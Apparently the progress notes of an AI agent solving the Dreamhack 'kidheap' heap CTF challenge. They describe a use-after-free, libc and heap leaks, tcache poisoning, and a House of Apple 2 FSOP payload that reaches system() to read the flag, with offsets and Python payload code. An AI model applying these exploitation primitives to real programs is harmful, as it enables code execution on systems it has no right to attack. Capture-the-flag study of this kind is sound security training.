# kidheap progress state

## Scope

- User requested solving only with files in current directory.
- Working directory: `/tmp/codex-test/kidheap`
- Remote: `host3.dreamhack.games 20427`
- Flag format: `DH{...}`

## Files used

- `deploy/prob`
- `prob.patched`
- `libc-ubuntu22/libc.so.6`
- `Dockerfile`
- `solve.py`
- `flag` only for local verification output

An Ubuntu 22.04 loader was copied from the local Docker image into:

- `libc-ubuntu22/ld-linux-x86-64.so.2.real`

This was used to run `deploy/prob` with the bundled libc locally:

```bash
./libc-ubuntu22/ld-linux-x86-64.so.2.real --library-path ./libc-ubuntu22 ./deploy/prob
```

## Binary behavior

- 64-bit PIE, Full RELRO, NX, canary.
- Menu:
  - `1. create note`
  - `2. delete note`
  - `3. edit note`
  - `4. print note`
  - `5. exit`
- `create` checks idx is `0..15`.
- `delete`, `edit`, and `show` do not perform the same bounds check.
- Note layout inferred from decomp:
  - struct size: `0x20`
  - `+0x00`: name size
  - `+0x08`: idx
  - `+0x10`: name pointer
  - `+0x18`: content pointer
- `create` alloc order:
  - note struct: `malloc(0x20)`
  - content: `malloc(0x100)` -> chunk size `0x110`
  - name: `malloc(name_size)`
- `delete` frees:
  - content
  - name
  - note struct
- `delete` does not clear pointers.
- `delete` toggles deleted flag even if already deleted:
  - first delete frees and marks deleted
  - second delete does not free, but toggles flag back to not-deleted
- This gives UAF for `show` and `edit`.

## Leaks

Initial leak strategy in `solve.py`:

1. Create 8 notes with `name_size=0x18`.
2. Delete all 8.
3. `delete(7)` again toggles deleted flag back without freeing.
4. `show(7)` leaks unsorted-bin content pointer.
5. The unsorted leak offset for bundled libc:

```python
libc.address = libc_leak - 0x21ace0
```

6. `delete(0)` toggles note 0 back.
7. `show(0)` leaks safe-linking key from a freed tcache chunk:

```python
heap_key = leak
heap_base_page = heap_key << 12
protect(pos, ptr) = (pos >> 12) ^ ptr
```

Observed local/Docker/remote leak shapes:

- libc leak: `libc_base + 0x21ace0`
- heap key: heap page base shifted right 12
- note/chunk layout is stable between local Docker and remote.

## Local Docker equivalence check

Dockerfile uses:

```Dockerfile
FROM ubuntu:22.04
CMD socat TCP-LISTEN:8080,reuseaddr,fork EXEC:./prob,stderr
```

Local Docker service was run as:

```bash
docker run -d --rm -p 31337:8080 kidheap-local
```

The exploit was verified against:

```bash
python3 solve.py REMOTE HOST=127.0.0.1 PORT=31337
```

## Attempted approaches

### Stack overwrite via tcache poisoning

Implemented and tested:

- Use 0x20 name tcache poisoning to allocate at `libc.environ`.
- Leak stack pointer.
- Use 0x40 tcache poisoning to write ROP near a stack return address.
- Local direct execution with bundled libc/loader worked at offset `0x140` and printed local flag.
- Remote did not work reliably due to stack frame/layout difference or return-target mismatch.
- This path was abandoned in favor of FSOP.

### `__free_hook`

Tested because symbols exist in glibc 2.35:

- Wrote `"/bin/sh\x00" + system` at `__free_hook - 8`.
- Freeing the chunk resulted in `free(): invalid pointer`.
- Conclusion: `__free_hook` is not a viable control-flow hook on this glibc path.

### FSOP / House of Apple 2

This is the promising path.

Plan:

1. Use UAF/tcache to get libc and heap leaks.
2. Recover exact heap chunk addresses from tcache fd links:

```python
name0 = u64le(name1_raw) ^ heap_key
content0 = u64le(content1_raw) ^ heap_key
content1 = content0 + 0x160
content2 = content0 + 0x2c0
```

Observed layout:

- `content0`: fake `_IO_FILE`
- `content1`: fake wide data
- `content2`: fake vtable

3. Build fake FILE, fake wide data, fake vtable.
4. Use a fresh 0x20 tcache poisoning to make a name allocation return `libc._IO_list_all`.
5. Write `content0` into `_IO_list_all`.
6. Call menu `5` -> `exit()` -> glibc flush path follows `_IO_list_all`.
7. Fake FILE + wide data + fake vtable reaches `system(cmd)`.

Important libc symbols from bundled libc:

```text
_IO_list_all     0x21b680
_IO_wfile_jumps  0x2170c0
_IO_file_jumps   0x217600
system           0x50d70
environ          0x222200
```

Since the unsorted leak is `libc + 0x21ace0`, `_IO_list_all` is:

```python
io_list_all = libc_leak + 0x9a0
```

This was verified with arbitrary read on both Docker and remote:

- Docker:
  - `_IO_list_all@...c680 => ...c6a0`
- Remote:
  - `_IO_list_all@...6680 => ...66a0`

So `_IO_list_all` offset matches remote.

## FSOP payload currently in `solve.py`

Current high-level payload:

```python
cmd = b" sh -c 'cat f*'"

fake_file = flat({
    0x00: cmd + b"\x00",
    0x20: p64(0),
    0x28: p64(1),
    0x68: p64(0),
    0x88: p64(content0 + 0xf0),
    0xa0: p64(content1),
    0xc0: p32(0),
    0xd8: p64(io_wfile_jumps),
}, filler=b"\x00")

fake_wide = flat({
    0x18: p64(0),
    0x20: p64(1),
    0x30: p64(0),
    0xe0: p64(content2),
}, filler=b"\x00")

fake_vtable = flat({
    0x68: p64(system),
}, filler=b"\x00")
```

`cmd` must start with a space. Commands like `b"/bin/cat flag"` broke local execution because the low bytes overlap `_flags` checks.

Commands that worked locally/Docker:

- `b" sh -c 'cat * /f*'"` worked but dumped `prob` too.
- `b" sh -c 'cat f* /f*'"` worked locally/Docker and showed `DH{**flag**}` plus `/f*` error.
- `b" sh -c 'cat f*'"` worked locally/Docker and showed only `DH{**flag**}`.

## Current status

### Works

Local direct bundled-loader execution:

```bash
python3 solve.py LOG=error
```

prints:

```text
DH{**flag**}
```

Local Docker socat service:

```bash
python3 solve.py REMOTE HOST=127.0.0.1 PORT=31337 LOG=error
```

prints:

```text
DH{**flag**}
```

### Remote behavior

Remote leaks match Docker:

Example:

```text
libc leak: 0x7fdcbf3a8ce0
libc base: 0x7fdcbf18e000
heap key: 0x559c19022
name0: 0x559c190223e0
content0: 0x559c190222d0
content1: 0x559c19022430
content2: 0x559c19022590
```

Remote `_IO_list_all` arbitrary read also matches Docker:

```text
_IO_list_all@0x7fb97e036680 => 0x7fb97e0366a0
```

But the final remote FSOP currently closes without output.

This means:

- libc leak is correct.
- heap leak/layout is correct.
- `_IO_list_all` offset is correct.
- tcache poisoning to arbitrary libc address works enough to read `_IO_list_all`.
- Difference is likely in the final FSOP call path or command/output behavior on remote.

## Next concrete checks

Avoid blind scanning.

1. Compare remote and Docker `_IO_wfile_jumps` relevant slots with arbitrary read.
   - A previous attempt to read several slots failed because `READ_OFF` path used the same drained tcache state incorrectly for arbitrary libc addresses and crashed before returning. Fix read primitive if needed.

2. Verify the final `_IO_list_all` write on remote:
   - After writing `content0` to `_IO_list_all`, use a second arbitrary read if possible to confirm `_IO_list_all == content0`.
   - This is better than guessing.

3. If `_IO_list_all == content0` on remote:
   - The fake FILE fields need adjustment.
   - Try a more standard House of Apple 2 layout:
     - `_lock` should point to a known writable zeroed heap area.
     - `_wide_data` should be valid.
     - wide vtable pointer at `_wide_data + 0xe0` should point to fake vtable.
     - fake vtable slot for `doallocate` should point to `system`.

4. If `_IO_list_all != content0` on remote:
   - The final 0x20 tcache poisoning sequence is unstable remotely.
   - Reuse the confirmed arbitrary read primitive structure to make the final overwrite more deterministic.

## Current caveat

`solve.py` currently contains debugging options:

- `CHECK_IOLIST=1`
- `READ_ADDR=...`
- `READ_OFF=...`

The exploit path itself is FSOP and local/Docker verified, but remote final output is not yet recovered.
